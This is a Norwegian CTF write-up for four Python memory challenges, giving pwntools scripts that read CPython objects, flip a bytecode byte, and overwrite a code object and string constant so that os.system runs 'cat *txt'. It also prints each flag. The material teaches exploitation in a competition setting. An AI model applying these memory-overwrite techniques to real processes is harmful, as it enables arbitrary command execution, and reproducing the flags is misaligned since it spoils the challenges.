## PYMEM WARMUP

### Oppgave

Oppgaven er å hente ut flagget lagret i minnet ved hjelp av et pythonscript som lar deg lese minneadressene.

```
Welcome to a series of forensics challenges to understand memory layout of a running python process
pymem warmup: Let's get you warmed up!
id=0x7f2f75953440
read from memory address:
```

### Løsning

Min løsningen var å automatisere minneavlesningen med pwntools ved å starte med første addresse og be om å få lese hver 8. addresse. Til slutt dekoder jeg strengen til ascii-tegn.

```py
from pwn import *

# Connect to the remote service
io = remote('pymemwarmup.ept.gg', 1337, ssl=True)

io.recvuntil(b"=")
startAddr = int(bytes.decode(io.recvuntil(b"\n", drop=True)), 16)

result = b""
for i in range(50):
    # Send address
    addr = hex(startAddr + i*8)
    io.sendlineafter(b":", addr)

    # Read data and concat
    io.recvuntil(b": ")
    result += io.recvuntil(b"\n", drop=True)
    
# Decode bytestring
print(bytes.fromhex(bytes.decode(result)))

# Close the connection
io.close()
```

Resultatet fra koden over gir flagget i klartekst gjemt i minnedumpen:

```
b"\x01\x00\x00\x00\x00\x00\x00\x00\x80\xf1o#\xb1U\x00\x00J\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xffflag{xxx}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xb7o#\xb1U\x00\x002\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00unclosed file <_io.BufferedReader name='flag.txt'>\x00\x01\x10\x03\x10\x01\x08\x02\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xc0\xb7o#\xb1U\x00\x00:\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00All callers to this function MUST hold self._waitpid_lock.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xa0\xbbo#\xb1U\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00p\x00\xfe1\x12\x7f\x00\x00pp\xe81\x12\x7f\x00\x00\xb0\xdb\x182\x12\x7f\x00\x00"
```

<details>
  <summary>Flagg</summary>
  
  `flag{did_you_do_a_simple_memorydump?_tha7_will_not_work_on_the_next_chal!}`
</details>



## PYMEM POINTERS

### Oppgave

Oppgaven er å hente ut flagget lagret i en 2d-liste i python. Lister i python lagres som et array av pointers, derav navnet på oppgaven.

```
pymem pointers: brute-force will not work here, read pointers like CPython!
id=0x7fc61e1d0800
read from memory address:
```

### Løsning

Som vi kan se i [kildekoden](https://github.com/python/cpython/blob/5c22476c01622f11b7745ee693f8b296a9d6a761/Include/listobject.h#L22) til CPython lagres lister som et objekt med denne strukturen (forenklet):

```
   # PyListObject       # ob_item (array of pointers to other objects):
+------------------+                    +----------+
| ob_refcnt  num   |                    | 0x111111 |
+------------------+                    +----------+
| ob_type   type*  |           / - - -> | 0x222222 |
+------------------+          /         +----------+
| ob_size    num   |         /          | 0x333333 |
+------------------+        /           +----------+
| ob_item    ptr*  | - - - /
+------------------+
| allocated  num   |
+------------------+
```

Lista vi skal finne er i to dimensjoner. Vi går gjennom `ob_item` til den ytterste lista for å gå igjennom alle underlistene. Vi gjentar prosessen for underlistene, men denne gangen vet vi at det kun ligger én pointer i `ob_item`. I dette feltet finner vi en tallverdi som også står oppført i [kildekoden](https://github.com/python/cpython/blob/5c22476c01622f11b7745ee693f8b296a9d6a761/Include/longobject.h) til CPython (forenklet):

```
+-------------------+
| ob_refcnt:   num  | 
+-------------------+
| ob_type:    type* |
+-------------------+
| ob_size      num  |
+-------------------+
| ob_digit[0]  num  |
+-------------------+
```

Koden bruker pwntools for å iterere over den ytterste listen og leter gjennom hierarkiet for hver bokstav i flagget. For å lese minneadressene riktig må adressene i oppgaven konverteres fra **big-endian** til **little-endian**. Det skjer i `read_addr`-funksjonen.


```py
from pwn import *

# Read memory address
def read_addr(addr):
    io.sendlineafter(b":", addr)
    # Read data and concat
    io.recvuntil(b": ")
    value = bytes.fromhex(io.recvuntil(b"\n", drop=True).decode('utf-8'))[::-1].hex()
    return value

# Connect to the remote service
io = remote('pymempointers.ept.gg', 1337, ssl=True)

# Read flag object id
io.recvuntil(b"=")
f_list = int(bytes.decode(io.recvuntil(b"\n", drop=True)), 16)

f_ptr = read_addr( hex(    f_list   + 3*8) ) # First list of pointers

flag = ""
flag_length = read_addr( hex(f_list + 2*8) )
for i in range(int(flag_length, 16)):
    s_list    = read_addr( hex(int(f_ptr, 16)     + i*8) ) # Second list
    s_ptr     = read_addr( hex(int(s_list, 16)    + 3*8) ) # Second list of pointers
    long_elmt = read_addr( hex(int(s_ptr, 16)          ) ) # Long element
    number    = read_addr( hex(int(long_elmt, 16) + 3*8) ) # Number as hex
    flag += chr(int(number,16)) # Convert to character and append to flag

print(flag)

# Close the connection
io.close()
```

<details>
  <summary>Flagg</summary>
  
  `flag{PyTypeObject_in_CPython's_sourcecode_had_all_what_you_needed!}`
</details>



## PYPWN ONEBYTE

### Oppgave

Oppgaven er å endre en byte i stacken til et pythonprogram for å flippe en ifstatement så den blir sann. Formatet på terminalen er likt som før:

```
pypwn onebyte: you are allowed to write just one byte, can we reach the unreachable code?
id=0x7fe98ba43370
read from memory address:
```

### Løsning

Vi bruker det vi lærte fra tidligere oppgaver, men denne gangen er det `PyFunctionObject` vi er interessert i. Denne peker til et eget element `PyCodeObject`. Den inneholder informasjon som konstanter, variabler og strings i funksjonen. Elementet vi er interessert i er `instruction opcodes` også kalt `co_code`.

co_code gir oss en liste over nøyaktig hva pythonfunksjonen foretar seg. Her er et utsnitt fra noen av addressene:
```
0x00007fe98bb05430: 64017d007c006402
0x00007fe98bb05438: 6b02721774006403
0x00007fe98bb05440: 8301010074007401
0x00007fe98bb05448: 640464058302a002
```

instruksjonene leses i en og en byte og kodene betyr forskjellige ting. Noen av de jeg trengte å forså for å løse denne oppgaven var:

1. `64` : LOAD_CONST
1. `7D` : STORE_FAST
1. `83` : COMPARE_OP

Spør vi ChatGPT om å ta en titt kan den bryte opp alle instruksjonene i en lettfatta liste:

```
64017d007c006402
6b02721774006403
8301010074007401

LOAD_CONST 1: Load constant False onto the stack.
STORE_FAST 0: Store the value (False) in local variable x.
LOAD_FAST 0: Load the value of local variable x onto the stack.
LOAD_CONST 2: Load constant True onto the stack.
COMPARE_OP 2: Compare the top two elements on the stack for equality (==).
...
```

Nå som jeg forstår hva koden gjør ønsker jeg å gjøre slik at True kan lases for sammenlikning stedenfor False. Det gjør jeg ved å bytte ut **64 01** (`LOAD_CONST FALSE*`) med **64 02** (`LOAD_CONST TRUE*`)

Koden i under dumper alt du trenger å analysere i terminalen, så trenger du bare å analysere og bytte ut riktig byte manuelt.

NB: Hvis oppgaven skal debugges lokalt er det viktig å bruke linux ettersom addressene på windows ser noe annerledes ut (mner tungvint etter min erfaring)

```py
from pwn import *

# Read memory address
def read_addr(addr):
    io.sendlineafter(b":", addr)
    # Read data and concat
    io.recvuntil(b": ")
    value = bytes.fromhex(io.recvuntil(b"\n", drop=True).decode('utf-8'))[::-1].hex()
    return value

# Connect to the remote service
io = remote('pypwnonebyte.ept.gg', 1337, ssl=True)

# Read flag object id
io.recvuntil(b"=")
PyFunctionObject = bytes.decode(io.recvuntil(b"\n", drop=True))
print("PyFunctionObject:", PyFunctionObject)

PyCodeObject = read_addr( hex(int(PyFunctionObject, 16) + 6*8) )
print("PyCodeObject:", PyCodeObject)
    
co_code = read_addr( hex(int(PyCodeObject, 16) + 6*8) )
print("co_code :", co_code)

for i in range(4, 8):
    print(read_addr( hex(int(co_code, 16) + i*8) ))

io.interactive() # Use interactive mode to do the final step of analyzing and changing the right bit.

# Close the connection
io.close()
```

<details>
  <summary>Flagg</summary>
  
  `flag{aLl_w3_neEDed_wAs_a_co_code_fl1p!}`
</details>



## PYPWN EXEC

### Oppgave

Denne oppgaven dreier seg om å endre handlemåte og argumentet gitt i `shell` før programmet kjører funksjonen nederst i programmet. Av de tre funksjonene nedenfor får vi kun oppgitt adressen til `shell`-funksjonen:

```py
def exec(arg):
    os.system(arg)

def debug(arg):
    print(arg)

def shell():
    debug("id")
```

### Løsning

Vi trenger å endre to ting. Hvilken funksjon som kjøres må endres fra debug til exec. Og stringen "id" må endres til en kommando som kan skrive ut flagget fra filen flag.txt.

Å bytte ut stringen er ikke så vanskelig. I minnet finner vi et PyUnicodeObjekt der vi kan bytte ut teksten "id" med vår egen tekst:

```
0x00007fe49ba98a70: 0000000000000014 # HEAD
0x00007fe49ba98a78: 00005648392167c0 # Type
0x00007fe49ba98a80: 0000000000000002 # Lengde på string <- 08
0x00007fe49ba98a88: d5f125e0c0265022 # Hash
0x00007fe49ba98a90: 00000000000000e5 #
0x00007fe49ba98a98: 0000000000000000 # NULL
0x00007fe49ba98aa0: 0000000000006469 # String <- 2a63617420747874 (cat *txt)
```

Å bytte ut funksjonen er litt mer komplisert. Vi utnytter at funksjonene ligger ved siden av hverandre i minnet med konstant avstand, 0x90. Det gjør at vi kan både lese og skrive over innholdet i både exec og debug. Hvis vi nå erstatter instruksjonene til debug med intsruksjoner fra exec vil debug nå oppføre seg som exec.

Ettersom intrsuksjonene peker til stringen med en absolutt pointer vil instruksjonene fortsatt lese den gamle stringen (som nå er endret).


```py
from pwn import *

# Read memory address
def read_addr(addr):
    io.sendlineafter(b":", addr)
    # Read data and concat
    io.recvuntil(b": ")
    value = bytes.fromhex(io.recvuntil(b"\n", drop=True).decode('utf-8'))[::-1].hex()
    return value

# Read memory address
def write_addr(addr, value):
    io.sendlineafter(b":", addr)
    io.sendlineafter(b":", value)
    # Clean up response
    io.recvuntil(b"\n", drop=True).decode('utf-8')

# Connect to the remote service
io = remote('pypwnexec.ept.gg', 1337, ssl=True)
# io = process(["python3","./source.py"]) # local debugging

# Shell
print(io.recvuntil(b"="))
ShellFunctionObject = bytes.decode(io.recvuntil(b"\n", drop=True))
ShellCodeObject = read_addr(hex(int(ShellFunctionObject, 16) + 6*8))
Shell_co_consts = read_addr(hex(int(ShellCodeObject, 16) + 7*8))
arg_str = read_addr( hex(int(Shell_co_consts, 16) + 4*8) )
print(f"The constants list where \"id\" will be replaced starts at: {arg_str}")

# Debug
DebugFunctionObject = hex(int(ShellFunctionObject, 16) - 144) # Debug is -0x90 relative to Shell

# Exec
ExecFunctionObject = hex(int(ShellFunctionObject, 16) - 288)  # Exec is -0x120 relative to Shell
ExecCodeObject = read_addr( hex(int(ExecFunctionObject, 16) + 6*8))
print(f"code object of exec: {ExecCodeObject} will be replaced with code object in debug at address {hex(int(DebugFunctionObject, 16) + 6*8)}")

# Exit read mode
io.sendlineafter(b":", "write")

# Change string "id" -> "cat *txt"
write_addr(hex(int(arg_str, 16) + 2*8), "08") # update length of str
for i in range(0, 16, 2):
    write_addr(hex(int(arg_str, 16) + 6*8 + i//2), bytes.fromhex("7478742a20746163")[::-1].hex()[i:i+2])

# Change co_code debug -> exec
for i in range(0, 16, 2):
    write_addr(hex(int(DebugFunctionObject, 16) + 6*8 + i//2), bytes.fromhex(ExecCodeObject)[::-1].hex()[i:i+2])

# Exit read mode
io.sendlineafter(b":", "write")

io.interactive() # Use interactive mode to do the final step of analyzing and changing the right bit.

# Close the connection
io.close()
```

<details>
  <summary>Flagg</summary>
  
  `flag{d1D_YOu_in-meMoRY_oVerWriTe_0f_globals_debug?}`
</details>